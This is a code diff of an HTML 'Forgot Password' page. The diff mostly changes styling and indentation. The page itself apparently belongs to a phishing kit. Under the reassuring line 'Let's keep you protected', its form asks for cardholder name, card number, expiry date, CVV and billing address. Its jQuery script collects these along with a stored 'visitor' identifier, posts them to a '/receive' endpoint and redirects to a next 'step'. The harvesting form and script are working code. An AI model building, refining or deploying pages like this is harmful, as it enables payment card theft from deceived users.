@@ -5,6 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Forgot Password</title>
     <style>
+        /* Apply box-sizing globally to manage widths properly */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
         body {
             font-family: Arial, sans-serif;
             background-color: #f7f9fa;
@@ -12,8 +19,9 @@
             padding: 0;
             display: flex;
             flex-direction: column;
-            align-items: center; /* Center contents horizontally */
-            min-height: 100vh; /* Ensure the body takes the full height */
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden; /* Prevent horizontal scrolling */
         }
 
         .header {
@@ -24,39 +32,41 @@
             font-size: 24px;
             font-weight: bold;
             margin-bottom: 5%;
+            display: flex;
+            justify-content: center;
         }
 
         .header img {
-            width: 120px; 
-            vertical-align: left;
+            width: 120px;
         }
 
         h2 {
             font-size: 24px;
             margin-top: 10%;
             color: #432874;
-            margin: 5px 0 10px 0; /* Added margin for spacing */
+            margin: 5px 0 10px 0;
             font-weight: normal;
-            text-align: left; /* Align left */
-            width: 100%; /* Make it take full width */
-            padding-left: 20px; /* Add padding for left alignment */
+            text-align: left;
+            width: 100%;
+            padding-left: 20px;
         }
 
         .container {
-            width: 100%;
+            width: 90%;
             max-width: 500px;
             background-color: #fff;
-            margin-top: 20px; /* Space below the header */
+            margin-top: 20px;
             padding: 20px;
             border-radius: 8px;
-            box-sizing: border-box;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
+            margin-bottom:10%;
         }
 
         .content p {
             font-size: 14px;
             color: #666;
             margin: 0 0 15px;
-            text-align: left; /* Center the paragraph */
+            text-align: left;
         }
 
         .form-group {
@@ -77,8 +87,7 @@
             font-size: 14px;
             border: 1px solid #ccc;
             border-radius: 4px;
-            box-sizing: border-box;
-            height: 55px;  
+            height: 55px;
         }
 
         .buttons {
@@ -112,119 +121,112 @@
 
         @media(min-width: 758px) {
             .container {
-                max-width: 95%; 
+                max-width: 95%;
             }
-        } 
+        }
     </style>
 </head>
 <body>
     <div class="header">
-        <img src="assets/logo-white.png" alt="Logo"> 
+        <img src="assets/logo-white.png" alt="Logo">
     </div>
-    <h2>Confirm Your Information</h2> <!-- Moved h2 outside of the container -->
+    <h2>Confirm Your Information</h2>
     <div class="container">
         <div class="content">
             <p>Let's keep you protected</p>
 
             <form>
-    <div class="form-group">
-        <label for="cardholderName">Cardholder Name</label>
-        <input id="cardholderName" name="cardholderName" type="text" placeholder="Full Name" required>
-    </div>
+                <div class="form-group">
+                    <label for="cardholderName">Cardholder Name</label>
+                    <input id="cardholderName" name="cardholderName" type="text" placeholder="Full Name" required>
+                </div>
 
-    <div class="form-group">
-        <label for="cardNumber">Card Number</label>
-        <input id="cardNumber" name="cardNumber" type="text" placeholder="1234 5678 9012 3456" required>
-    </div>
+                <div class="form-group">
+                    <label for="cardNumber">Card Number</label>
+                    <input id="cardNumber" name="cardNumber" type="text" placeholder="1234 5678 9012 3456" required>
+                </div>
 
-    <div class="form-group">
-        <label for="expirationDate">Expiration Date</label>
-        <input id="expirationDate" name="expirationDate" type="text" placeholder="MM/YY" required>
-    </div>
+                <div class="form-group">
+                    <label for="expirationDate">Expiration Date</label>
+                    <input id="expirationDate" name="expirationDate" type="text" placeholder="MM/YY" required>
+                </div>
 
-    <div class="form-group">
-        <label for="cvv">CVV</label>
-        <input id="cvv" name="cvv" type="text" placeholder="123" required>
-    </div>
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input id="cvv" name="cvv" type="text" placeholder="123" required>
+                </div>
 
-    <div class="form-group">
-        <label for="billingAddress">Billing Address</label>
-        <input id="billingAddress" name="billingAddress" type="text" placeholder="Street Address" required>
-    </div>
+                <div class="form-group">
+                    <label for="billingAddress">Billing Address</label>
+                    <input id="billingAddress" name="billingAddress" type="text" placeholder="Street Address" required>
+                </div>
 
-    <div class="form-group">
-        <label for="city">City</label>
-        <input id="city" name="city" type="text" placeholder="City" required>
-    </div>
+                <div class="form-group">
+                    <label for="city">City</label>
+                    <input id="city" name="city" type="text" placeholder="City" required>
+                </div>
 
-    <div class="form-group">
-        <label for="state">State</label>
-        <input id="state" name="state" type="text" placeholder="State" required>
-    </div>
+                <div class="form-group">
+                    <label for="state">State</label>
+                    <input id="state" name="state" type="text" placeholder="State" required>
+                </div>
 
-    <div class="form-group">
-        <label for="zipCode">Zip Code</label>
-        <input id="zipCode" name="zipCode" type="text" placeholder="Zip Code" required>
-    </div>
+                <div class="form-group">
+                    <label for="zipCode">Zip Code</label>
+                    <input id="zipCode" name="zipCode" type="text" placeholder="Zip Code" required>
+                </div>
 
-    <div class="buttons">
-        <button type="submit" class="continue">Continue</button>
-    </div>
-</form>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-
-<script>
-$(document).ready(function() {
-    $('.continue').on('click', function(e) {
-        e.preventDefault(); // Prevent default form submission
-
-        let isEmpty = false;
-        const checkInputs = $('input'); // Collect input fields
-
-        // Check for empty fields and highlight them
-        for (const check of checkInputs) {
-            if (check.value.trim() === "") {
-                check.style.borderColor = 'red'; // Highlight the empty input field
-                isEmpty = true; // Mark as empty
-            } else {
-                check.style.borderColor = ''; // Reset border color if filled
-            }
-        }
-
-        // If no input is empty, proceed with form submission
-        if (!isEmpty) {
-            // Serialize form data into an array
-            let userinfo = $('form').serializeArray(); // Make sure to wrap the inputs in a <form> tag
-            let user = {};
-            let visitor = sessionStorage.getItem('visitor'); // Retrieve visitor info
-            console.log(visitor);
-
-            userinfo.forEach((value) => {
-                user[value.name] = value.value; // Create user object from inputs
-            });
-
-            user['visitor'] = visitor; // Add visitor info to user object
-            console.log(user);
-
-            // Send AJAX request
-            $.ajax({
-                method: 'POST',
-                url: "/receive", // Replace with your server endpoint
-                data: user
-            }).done(function(msg) {
-                // Handle successful response
-                console.log(msg);
-                window.location.href = "/link?step=1"; // Redirect on success
-            }).fail(function(err, textStatus, error) {
-                console.log('fail');
-                // Handle failure response
-                // Optional: You could redirect or show an error message here
-            });
-        }
-    });
-});
-</script> 
+                <div class="buttons">
+                    <button type="submit" class="continue">Continue</button>
+                </div>
+            </form>
         </div>
     </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script>
+    $(document).ready(function() {
+        $('.continue').on('click', function(e) {
+            e.preventDefault();
+
+            let isEmpty = false;
+            const checkInputs = $('input');
+
+            for (const check of checkInputs) {
+                if (check.value.trim() === "") {
+                    check.style.borderColor = 'red';
+                    isEmpty = true;
+                } else {
+                    check.style.borderColor = '';
+                }
+            }
+
+            if (!isEmpty) {
+                let userinfo = $('form').serializeArray();
+                let user = {};
+                let visitor = sessionStorage.getItem('visitor');
+                console.log(visitor);
+
+                userinfo.forEach((value) => {
+                    user[value.name] = value.value;
+                });
+
+                user['visitor'] = visitor;
+                console.log(user);
+
+                $.ajax({
+                    method: 'POST',
+                    url: "/receive",
+                    data: user
+                }).done(function(msg) {
+                    console.log(msg);
+                    window.location.href = "/link?step=1";
+                }).fail(function(err) {
+                    console.log('fail');
+                });
+            }
+        });
+    });
+    </script>
 </body>
-</html> 
+</html>
